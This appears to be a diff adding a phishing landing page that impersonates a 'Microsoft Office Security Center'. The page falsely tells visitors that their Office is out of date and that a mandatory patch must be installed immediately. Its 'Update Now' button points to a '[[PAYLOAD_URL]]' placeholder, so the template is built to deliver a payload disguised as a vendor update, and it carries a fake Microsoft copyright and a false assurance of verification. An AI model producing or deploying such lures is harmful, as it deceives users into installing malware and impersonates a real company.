@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Update</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f3f3;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            width: 600px;
+            padding: 40px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            border-top: 10px solid #0078d4;
+            text-align: center;
+        }
+        h1 {
+            color: #002050;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        hr {
+            border: 0;
+            border-top: 1px solid #ddd;
+            margin: 20px 0;
+        }
+        p {
+            color: #333;
+            line-height: 1.6;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .button {
+            display: inline-block;
+            background-color: #0078d4;
+            color: #ffffff;
+            padding: 15px 30px;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 4px;
+            font-size: 18px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Microsoft Office Security Center</h1>
+        <hr>
+        <p>
+            Your version of Microsoft Office is out of date and may be vulnerable.
+            To ensure the security of your documents and data, a mandatory
+            security patch must be applied immediately.
+        </p>
+        <p>
+            Please click the <b>'Update Now'</b> button below to start the automatic
+            installation process. This process is secure and verified by Microsoft.
+        </p>
+        <div id="button-container">
+            <a href="[[PAYLOAD_URL]]" class="button" id="update-button">Update Now</a>
+        </div>
+        <div class="footer">
+            &copy; 2024 Microsoft Corporation. All rights reserved.
+        </div>
+    </div>
+</body>
+</html>
